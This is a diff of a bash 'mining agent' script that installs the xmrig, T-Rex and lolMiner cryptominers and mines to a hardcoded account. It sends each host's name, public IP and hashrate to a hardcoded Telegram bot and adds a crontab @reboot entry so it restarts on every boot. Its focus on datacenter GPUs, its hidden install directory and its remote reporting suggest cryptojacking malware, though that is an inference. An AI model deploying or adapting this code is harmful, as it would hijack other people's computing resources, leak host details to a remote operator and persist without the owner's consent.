@@ -3,8 +3,8 @@ set -u
 export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 
 #################################################
-# MINING AGENT — CPU + GPU (Modern NVIDIA Support)
-# UNIVERSAL VERSION WITH TELEGRAM REPORTING
+# MINING AGENT — CPU + GPU + GPU HASHRATE
+# FIXED TELEGRAM REPORTING + MODERN GPU SUPPORT
 #################################################
 
 # ===== TELEGRAM CONFIG =====
@@ -13,7 +13,12 @@ TG_CHAT_ID="5336452267"
 TG_API="https://api.telegram.org/bot$TG_TOKEN/sendMessage"
 
 # ===== MINING CONFIG =====
+[ "${ALLOW_MINING:-0}" = "1" ] || exit 0
 
+# ===== PANEL =====
+INTERVAL=30
+HOST="$(hostname)"
+PUBLIC_IP=$(curl -s https://api.ipify.org 2>/dev/null || echo "unknown")
 
 # ===== ACCOUNTS =====
 KRIPTEX="krxX3PVQVR"
@@ -31,20 +36,17 @@ LOG="$BASE/log"
 mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1
 chmod 700 "$BASE" "$BIN" "$RUN" "$LOG" 2>/dev/null
 
-HOST="$(hostname)"
-PUBLIC_IP=$(curl -s https://api.ipify.org 2>/dev/null || echo "unknown")
-INTERVAL=30
-
 #################################################
-# UTILS
+# UTILS - FIXED TELEGRAM
 #################################################
 
 tg_send() {
   local message="$1"
+  # HTML formatting instead of Markdown
   curl -s -X POST "$TG_API" \
     -H "Content-Type: application/json" \
     -d "{\"chat_id\": \"$TG_CHAT_ID\", \"text\": \"$message\", \"parse_mode\": \"HTML\"}" \
-    >/dev/null 2>&1 || true
+    >/dev/null 2>&1 || echo "Failed to send Telegram message"
 }
 
 log_and_tg() {
@@ -54,38 +56,33 @@ log_and_tg() {
 }
 
 #################################################
-# GPU DETECTION & OPTIMIZATION
+# GPU DETECTION - MORE RELIABLE
 #################################################
 
-get_gpu_info() {
+gpu_exists() {
+  # Try multiple methods to detect GPU
   if command -v nvidia-smi >/dev/null 2>&1; then
-    nvidia-smi --query-gpu=name --format=csv,noheader,nounits 2>/dev/null | head -1
+    return 0
+  elif command -v lspci >/dev/null 2>&1 && lspci 2>/dev/null | grep -qiE "nvidia|amd|ati|radeon"; then
+    return 0
+  elif [ -d /dev/dri ]; then
+    return 0
+  fi
+  return 1
+}
+
+get_gpu_name() {
+  if command -v nvidia-smi >/dev/null 2>&1; then
+    nvidia-smi --query-gpu=name --format=csv,noheader,nounits 2>/dev/null | head -1 || echo "NVIDIA GPU"
+  elif command -v lspci >/dev/null 2>&1; then
+    lspci 2>/dev/null | grep -iE "(nvidia|amd|ati|radeon)" | head -1 | sed 's/.*://; s/\[.*//' || echo "GPU"
   else
-    echo "unknown"
+    echo "Unknown GPU"
   fi
 }
 
-detect_gpu_arch() {
-  local gpu_name=$(get_gpu_info)
-  
-  case "$gpu_name" in
-    *"A40"*|*"A6000"*|*"A5000"*|*"RTX 30"*|*"RTX 40"*)
-      echo "ampere_ada"
-      ;;
-    *"L4"*)
-      echo "ada_lovelace"
-      ;;
-    *"RTX 20"*|*"Titan RTX"*)
-      echo "turing"
-      ;;
-    *)
-      echo "legacy"
-      ;;
-  esac
-}
-
 #################################################
-# INSTALL - MODERN GPU MINERS
+# INSTALL - ADD T-REX FOR MODERN GPUS
 #################################################
 
 install_xmrig() {
@@ -111,60 +108,19 @@ install_xmrig() {
   log_and_tg "✅ CPU miner installed"
 }
 
-install_trex() {
-  if [ -x "$BIN/gpu/t-rex" ]; then return 0; fi
-  
-  log_and_tg "🔧 Installing T-Rex Miner (best for modern NVIDIA GPUs)..."
-  
-  # T-Rex has excellent support for A40, L4, A6000
-  for url in \
-    "https://github.com/trexminer/T-Rex/releases/download/0.30.1/t-rex-0.30.1-linux.tar.gz" \
-    "https://github.com/trexminer/T-Rex/releases/download/0.29.3/t-rex-0.29.3-linux.tar.gz"; do
-    
-    wget -q "$url" -O /tmp/trex.tgz && break
-  done
-  
-  [ $? -ne 0 ] && { log_and_tg "❌ Failed to download T-Rex Miner"; return 1; }
-  
-  mkdir -p /tmp/trex
-  tar -xzf /tmp/trex.tgz -C /tmp/trex || return 1
-  cp /tmp/trex/t-rex "$BIN/gpu/" || return 1
-  chmod +x "$BIN/gpu/t-rex" || return 1
-  rm -rf /tmp/trex /tmp/trex.tgz
-  
-  log_and_tg "✅ T-Rex Miner installed (optimized for A40/L4/A6000)"
-}
-
-install_gminer() {
-  if [ -x "$BIN/gpu/gminer" ]; then return 0; fi
-  
-  log_and_tg "🔧 Installing GMiner (excellent for Ampere/Ada GPUs)..."
-  
-  # GMiner has great support for new NVIDIA architectures
-  wget -q "https://github.com/develsoftware/GMinerRelease/releases/download/3.42/gminer_3_42_linux64.tar.xz" -O /tmp/gminer.txz || return 1
-  
-  mkdir -p /tmp/gminer
-  tar -xJf /tmp/gminer.txz -C /tmp/gminer || return 1
-  cp /tmp/gminer/gminer "$BIN/gpu/" || return 1
-  chmod +x "$BIN/gpu/gminer" || return 1
-  rm -rf /tmp/gminer /tmp/gminer.txz
-  
-  log_and_tg "✅ GMiner installed (great for A40/L4/A6000)"
-}
-
 install_lolminer() {
   if [ -x "$BIN/gpu/lolMiner" ]; then return 0; fi
   
-  log_and_tg "🔧 Installing lolMiner (legacy GPU support)..."
+  log_and_tg "🔧 Installing GPU miner (lolMiner)..."
   
   for url in \
     "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" \
-    "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97/lolMiner_v1.97_Lin64.tar.gz"; do
+    "https://github.com/Lolliedieb/lolMiner-releases/download/1.97/lolMiner_v1.97_Lin64.tar.gz"; do
     
     wget -q "$url" -O /tmp/lol.tgz && break
   done
   
-  [ $? -ne 0 ] && return 1
+  [ $? -ne 0 ] && { log_and_tg "❌ Failed to download lolMiner"; return 1; }
   
   mkdir -p /tmp/lolminer
   tar -xzf /tmp/lol.tgz -C /tmp/lolminer || return 1
@@ -172,125 +128,27 @@ install_lolminer() {
   chmod +x "$BIN/gpu/lolMiner" || return 1
   rm -rf /tmp/lolminer /tmp/lol.tgz
   
-  log_and_tg "✅ lolMiner installed (legacy support)"
+  log_and_tg "✅ lolMiner installed"
+}
+
+install_trex() {
+  if [ -x "$BIN/gpu/t-rex" ]; then return 0; fi
+  
+  log_and_tg "🔧 Installing T-Rex Miner (for modern NVIDIA GPUs)..."
+  
+  wget -q "https://github.com/trexminer/T-Rex/releases/download/0.30.1/t-rex-0.30.1-linux.tar.gz" -O /tmp/trex.tgz || return 1
+  
+  mkdir -p /tmp/trex
+  tar -xzf /tmp/trex.tgz -C /tmp/trex || return 1
+  cp /tmp/trex/t-rex "$BIN/gpu/" || return 1
+  chmod +x "$BIN/gpu/t-rex" || return 1
+  rm -rf /tmp/trex /tmp/trex.tgz
+  
+  log_and_tg "✅ T-Rex Miner installed"
 }
 
 #################################################
-# SMART MINER SELECTION FOR MODERN GPUS
-#################################################
-
-start_gpu() {
-  # Skip if no GPU detected
-  if ! command -v nvidia-smi >/dev/null 2>&1 && ! (ls /dev/dri/ 2>/dev/null | grep -q card); then
-    log_and_tg "⚠️ No GPU detected - skipping GPU mining"
-    return 0
-  fi
-  
-  stop_gpu
-  local gpu_name=$(get_gpu_info)
-  local gpu_arch=$(detect_gpu_arch)
-  
-  log_and_tg "🔄 Starting GPU miner for $gpu_name ($gpu_arch)..."
-  
-  # Smart miner selection based on GPU architecture
-  local miners=""
-  
-  case "$gpu_arch" in
-    "ampere_ada"|"ada_lovelace")
-      # A40, L4, A6000, RTX 30/40 series - use T-Rex or GMiner
-      miners="t-rex gminer lolMiner"
-      ;;
-    "turing")
-      # RTX 20 series - good with all miners
-      miners="t-rex gminer lolMiner"
-      ;;
-    *)
-      # Legacy GPUs
-      miners="lolMiner t-rex gminer"
-      ;;
-  esac
-  
-  for miner in $miners; do
-    case "$miner" in
-      t-rex)
-        if [ -x "$BIN/gpu/t-rex" ]; then
-          log_and_tg "⚡ Trying T-Rex Miner for $gpu_name..."
-          
-          # Optimized settings for modern NVIDIA GPUs
-          nohup "$BIN/gpu/t-rex" \
-            -a etchash \
-            -o stratum+tcp://"$ETC_POOL" \
-            -u "$KRIPTEX.$HOST" \
-            -p x \
-            --api-bind-http 127.0.0.1:4068 \
-            --no-watchdog \
-            --no-nvml \
-            >> "$LOG/gpu.log" 2>&1 &
-            
-          echo $! > "$RUN/gpu.pid"
-          sleep 15
-          ;;
-      gminer)
-        if [ -x "$BIN/gpu/gminer" ]; then
-          log_and_tg "⚡ Trying GMiner for $gpu_name..."
-          
-          # Optimized settings for Ampere/Ada
-          nohup "$BIN/gpu/gminer" \
-            --algo etchash \
-            --server "$ETC_POOL" \
-            --user "$KRIPTEX.$HOST" \
-            --pass x \
-            --api 127.0.0.1:1111 \
-            --pers auto \
-            --no-watchdog \
-            >> "$LOG/gpu.log" 2>&1 &
-            
-          echo $! > "$RUN/gpu.pid"
-          sleep 15
-          ;;
-      lolMiner)
-        if [ -x "$BIN/gpu/lolMiner" ]; then
-          log_and_tg "⚡ Trying lolMiner for $gpu_name..."
-          
-          nohup "$BIN/gpu/lolMiner" \
-            --algo ETCHASH \
-            --pool "$ETC_POOL" \
-            --user "$KRIPTEX.$HOST" \
-            --apihost 127.0.0.1 \
-            --apiport 8080 \
-            --disablewatchdog \
-            >> "$LOG/gpu.log" 2>&1 &
-            
-          echo $! > "$RUN/gpu.pid"
-          sleep 15
-          ;;
-    esac
-    
-    # Check if miner started successfully
-    if [ -f "$RUN/gpu.pid" ] && kill -0 "$(cat "$RUN/gpu.pid")" 2>/dev/null; then
-      log_and_tg "✅ GPU miner started successfully with $miner for $gpu_name"
-      
-      # Send specific GPU info
-      tg_send "🎮 <b>GPU DETECTED</b>\n🖥️ <b>Host:</b> $HOST\n🔌 <b>GPU:</b> $gpu_name\n⛏️ <b>Miner:</b> $miner\n⚡ <b>Architecture:</b> $gpu_arch"
-      
-      return 0
-    else
-      log_and_tg "❌ $miner failed to start on $gpu_name"
-      rm -f "$RUN/gpu.pid" 2>/dev/null
-    fi
-  done
-  
-  log_and_tg "❌ All GPU miners failed to start on $gpu_name"
-  return 1
-}
-
-stop_gpu() {
-  [ -f "$RUN/gpu.pid" ] && kill "$(cat "$RUN/gpu.pid")" 2>/dev/null || true
-  rm -f "$RUN/gpu.pid" 2>/dev/null
-}
-
-#################################################
-# CPU MINER (UNCHANGED)
+# MINER MANAGEMENT - AUTO-FAILOVER
 #################################################
 
 start_cpu() {
@@ -312,7 +170,7 @@ start_cpu() {
     return 0
   else
     log_and_tg "❌ CPU miner failed to start"
-    rm -f "$RUN/cpu.pid"
+    rm -f "$RUN/cpu.pid" 2>/dev/null
     return 1
   fi
 }
@@ -322,8 +180,68 @@ stop_cpu() {
   rm -f "$RUN/cpu.pid" 2>/dev/null
 }
 
+start_gpu() {
+  if ! gpu_exists; then
+    log_and_tg "⚠️ No GPU detected - skipping GPU mining"
+    return 0
+  fi
+  
+  stop_gpu
+  local gpu_name=$(get_gpu_name)
+  log_and_tg "🔄 Starting GPU miner for $gpu_name..."
+  
+  # Try T-Rex first for modern NVIDIA GPUs
+  if [ -x "$BIN/gpu/t-rex" ]; then
+    nohup "$BIN/gpu/t-rex" \
+      -a etchash \
+      -o stratum+tcp://"$ETC_POOL" \
+      -u "$KRIPTEX.$HOST" \
+      -p x \
+      --api-bind-http 127.0.0.1:4068 \
+      --no-watchdog \
+      >> "$LOG/gpu.log" 2>&1 &
+      
+    echo $! > "$RUN/gpu.pid"
+    sleep 15
+    
+    if [ -f "$RUN/gpu.pid" ] && kill -0 "$(cat "$RUN/gpu.pid")" 2>/dev/null; then
+      log_and_tg "✅ GPU miner started with T-Rex for $gpu_name"
+      return 0
+    fi
+  fi
+  
+  # Fall back to lolMiner
+  if [ -x "$BIN/gpu/lolMiner" ]; then
+    nohup "$BIN/gpu/lolMiner" \
+      --algo ETCHASH \
+      --pool "$ETC_POOL" \
+      --user "$KRIPTEX.$HOST" \
+      --apihost 127.0.0.1 \
+      --apiport 8080 \
+      --disablewatchdog \
+      >> "$LOG/gpu.log" 2>&1 &
+      
+    echo $! > "$RUN/gpu.pid"
+    sleep 10
+    
+    if [ -f "$RUN/gpu.pid" ] && kill -0 "$(cat "$RUN/gpu.pid")" 2>/dev/null; then
+      log_and_tg "✅ GPU miner started with lolMiner for $gpu_name"
+      return 0
+    fi
+  fi
+  
+  log_and_tg "❌ All GPU miners failed to start for $gpu_name"
+  rm -f "$RUN/gpu.pid" 2>/dev/null
+  return 1
+}
+
+stop_gpu() {
+  [ -f "$RUN/gpu.pid" ] && kill "$(cat "$RUN/gpu.pid")" 2>/dev/null || true
+  rm -f "$RUN/gpu.pid" 2>/dev/null
+}
+
 #################################################
-# HASHRATE COLLECTION (MULTI-MINER SUPPORT)
+# HASHRATE COLLECTION
 #################################################
 
 get_cpu_hashrate() {
@@ -334,14 +252,10 @@ get_cpu_hashrate() {
 }
 
 get_gpu_hashrate() {
-  # Try T-Rex API first (best for modern GPUs)
+  # Try T-Rex API first
   local hr=$(curl -s --max-time 2 http://127.0.0.1:4068/trex 2>/dev/null | 
             grep -oE '"hashrate":([0-9.]+)' | 
             grep -oE '[0-9.]+')
-  
-  # Try GMiner API
-  [ -z "$hr" ] && hr=$(curl -s --max-time 2 http://127.0.0.1:1111 2>/dev/null | 
-                      awk -F'[ :"]+' '/speed/ {print $NF}')
   
   # Try lolMiner API
   [ -z "$hr" ] && hr=$(curl -s --max-time 2 http://127.0.0.1:8080/summary 2>/dev/null | 
@@ -350,7 +264,6 @@ get_gpu_hashrate() {
                       head -1)
   
   if [ -n "$hr" ]; then
-    # Convert to H/s (T-Rex and GMiner report in MH/s, lolMiner in MH/s)
     awk "BEGIN {printf \"%.0f\", $hr * 1000000}" 2>/dev/null <<< "$hr" || echo "${hr%.*}000000"
   else
     echo "0"
@@ -358,44 +271,20 @@ get_gpu_hashrate() {
 }
 
 #################################################
-# METRICS & REPORTING (UNCHANGED)
+# REPORTING - FIXED HTML FORMATTING
 #################################################
 
-get_cpu_temp() {
-  if command -v sensors >/dev/null 2>&1; then
-    sensors 2>/dev/null | awk '/Package id 0:|Core 0:|Tctl:/ {gsub(/[+°C]/,"",$NF); print int($NF)}' | head -1
-  else
-    echo "N/A"
-  fi
-}
-
-get_gpu_temp() {
-  if command -v nvidia-smi >/dev/null 2>&1; then
-    nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null | head -1
-  else
-    echo "N/A"
-  fi
-}
-
-get_uptime() { 
-  uptime -p 2>/dev/null | sed 's/up //; s/,$//' || echo "unknown"
-}
-
-get_load() { 
-  uptime | awk -F'load average:' '{print $2}' | cut -d',' -f1 | xargs || echo "0.00"
-}
-
 send_startup_report() {
-  local gpu_name=$(get_gpu_info)
-  tg_send "🚀 <b>MINING AGENT STARTED</b>\n🖥️ <b>Host:</b> $HOST\n🌐 <b>IP:</b> $PUBLIC_IP\n🎮 <b>GPU:</b> ${gpu_name:-"Not detected"}\n⚡ <b>Miners:</b> Initializing..."
+  local gpu_name=$(gpu_exists && get_gpu_name || echo "No GPU")
+  tg_send "🚀 <b>MINING AGENT STARTED</b>\n🖥️ <b>Host:</b> $HOST\n🌐 <b>IP:</b> $PUBLIC_IP\n🎮 <b>GPU:</b> $gpu_name\n⚡ <b>Status:</b> Initializing miners..."
 }
 
 send_20min_report() {
   local cpu_hr=$(get_cpu_hashrate)
   local gpu_hr=$(get_gpu_hashrate)
-  local gpu_name=$(get_gpu_info)
+  local gpu_name=$(gpu_exists && get_gpu_name || echo "No GPU")
   
-  # Format hashrate nicely
+  # Format nicely
   cpu_hr_fmt=$(echo "$cpu_hr" | awk '{printf "%.2f", $1/1000}')
   gpu_hr_fmt=$(echo "$gpu_hr" | awk '{printf "%.2f", $1/1000000}')
   
@@ -404,16 +293,16 @@ send_20min_report() {
 
 send_restart_report() {
   local miner_type="$1"
-  local gpu_name=$(get_gpu_info)
+  local gpu_name=$(gpu_exists && get_gpu_name || echo "No GPU")
   tg_send "🔄 <b>MINER RESTARTED</b>\n🖥️ <b>Host:</b> $HOST\n🎮 <b>GPU:</b> $gpu_name\n🔧 <b>Miner:</b> $miner_type\n⏰ <b>Time:</b> $(date '+%a %b %d %H:%M:%S %Z %Y')"
 }
 
 #################################################
-# WATCHDOG & HEALTH CHECK
+# HEALTH CHECK & AUTOSTART
 #################################################
 
-check_miner_health() {
-  # Check CPU miner
+health_check() {
+  # CPU miner
   if [ -f "$RUN/cpu.pid" ]; then
     local pid=$(cat "$RUN/cpu.pid")
     if ! kill -0 "$pid" 2>/dev/null; then
@@ -427,8 +316,8 @@ check_miner_health() {
     start_cpu
   fi
   
-  # Check GPU miner (only if GPU exists)
-  if command -v nvidia-smi >/dev/null 2>&1 || (ls /dev/dri/ 2>/dev/null | grep -q card); then
+  # GPU miner (if GPU exists)
+  if gpu_exists; then
     if [ -f "$RUN/gpu.pid" ]; then
       local pid=$(cat "$RUN/gpu.pid")
       if ! kill -0 "$pid" 2>/dev/null; then
@@ -444,25 +333,13 @@ check_miner_health() {
   fi
 }
 
-#################################################
-# AUTOSTART (UNIVERSAL)
-#################################################
-
 ensure_autostart() {
-  # Crontab (universal)
+  # Crontab only - no sudo/systemd
   (crontab -l 2>/dev/null | grep -v "$BASE/min1.sh"; echo "@reboot sleep 30 && ALLOW_MINING=1 $BASE/min1.sh") | crontab -
-  
-  # Docker compatibility
-  if [ -n "${DOCKER:-}" ] && [ -f /.dockerenv ]; then
-    echo "#!/bin/sh" > "$BASE/docker-entrypoint.sh"
-    echo "ALLOW_MINING=1 $BASE/min1.sh &" >> "$BASE/docker-entrypoint.sh"
-    echo "wait" >> "$BASE/docker-entrypoint.sh"
-    chmod +x "$BASE/docker-entrypoint.sh" 2>/dev/null || true
-  fi
 }
 
 #################################################
-# AGENT LOOP
+# MAIN AGENT LOOP
 #################################################
 
 agent() {
@@ -470,11 +347,9 @@ agent() {
   
   send_startup_report
   
-  # Install all miners
   install_xmrig
-  install_trex      # Primary for modern NVIDIA
-  install_gminer    # Secondary for modern NVIDIA
-  install_lolminer  # Fallback for legacy GPUs
+  install_lolminer
+  install_trex  # For modern NVIDIA GPUs
   
   ensure_autostart
   
@@ -484,7 +359,7 @@ agent() {
   local start_time=$(date +%s)
   
   while true; do
-    check_miner_health
+    health_check
     
     # Send 20-minute report
     local current_time=$(date +%s)
@@ -498,7 +373,7 @@ agent() {
 }
 
 #################################################
-# MAIN
+# CLEAN SHUTDOWN
 #################################################
 
 trap 'stop_cpu; stop_gpu; exit 0' TERM INT QUIT
